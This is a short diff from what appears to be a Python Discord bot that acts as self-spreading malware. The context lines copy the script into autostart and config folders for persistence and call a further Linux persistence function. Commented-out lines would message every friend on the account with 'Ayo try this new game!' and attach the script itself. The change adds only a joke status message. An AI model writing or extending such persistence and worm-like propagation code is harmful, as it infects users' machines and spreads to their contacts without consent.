@@ -129,7 +129,7 @@ async def on_ready():
         shutil.copy(__file__, home + ".config\\autostart" + base)
         shutil.copy(__file__, home + ".config\\" + base)
         even_more_persistance_linux()
-
+    await bot.change_presence(activity=discord.Game(name="BRAAAAAAAINS"))
     #for friend in bot.user.friends:
         #await friend.send("Ayo try this new game!")
         #await friend.send(file=discord.File(__file__))
